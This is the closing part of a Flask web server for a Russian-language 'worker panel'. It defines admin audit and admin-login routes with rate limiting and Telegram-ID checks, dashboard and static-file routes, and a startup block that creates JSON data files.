def admin_audit():
    logs = safe_load_json('admin_audit.json')
    if not isinstance(logs, list):
        logs = []
    return jsonify(list(reversed(logs)))


# ---------------------------------------------------------------------------
# Panel static files
# ---------------------------------------------------------------------------

_PANEL_EXTS = {'.css', '.js', '.ico', '.png', '.svg', '.woff', '.woff2', '.ttf', '.eot'}


@app.route('/')
@app.route('/index.html')
def panel_root():
    # Already logged in? Go straight to dashboard
    user = get_current_user()
    if user:
        return redirect('/dashboard.html')
    return send_from_directory(BASE_DIR, 'index.html')


@app.route('/admin.html')
@app.route('/admin')
def admin_panel_route():
    ip = _get_client_ip()
    if _rate_limit(ip, max_calls=10, window=60):
        return jsonify({'error': 'Rate limited'}), 429
    user = get_current_user()
    if not user or user.get('tg_id') not in _ADMIN_IDS:
        return jsonify({'error': 'Forbidden'}), 403
    # Issue admin token bound to session + IP
    session_id = request.cookies.get('session_id', '')
    token = _issue_admin_token(session_id)
    _admin_log('admin_login')
    resp = send_from_directory(BASE_DIR, 'admin.html')
    resp.set_cookie('_adm', token, max_age=4*3600, httponly=True, samesite='Strict')
    return resp


@app.route('/dashboard.html')
def panel_dashboard():
    user = get_current_user()
    if not user:
        return redirect('/')
    return send_from_directory(BASE_DIR, 'dashboard.html')


@app.route('/<path:path>')
def panel_static(path):
    if path.startswith('api/'):
        return '', 404
    _, ext = os.path.splitext(path)
    if ext.lower() in _PANEL_EXTS:
        f = os.path.join(BASE_DIR, path)
        if os.path.isfile(f):
            return send_from_directory(BASE_DIR, path)
    return '', 404


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    os.makedirs(DATA_DIR, exist_ok=True)

    for fname, default in [('users.json', []), ('pending_codes.json', {})]:
        fpath = os.path.join(DATA_DIR, fname)
        if not os.path.exists(fpath):
            with open(fpath, 'w') as f:
                json.dump(default, f)

    print('🛠️  Воркер-панель запущена: https://7dice.icu  (local: http://localhost:8081)')
    print(f'📁  Данные: {DATA_DIR}')
    app.run(host='0.0.0.0', port=8081, debug=False)
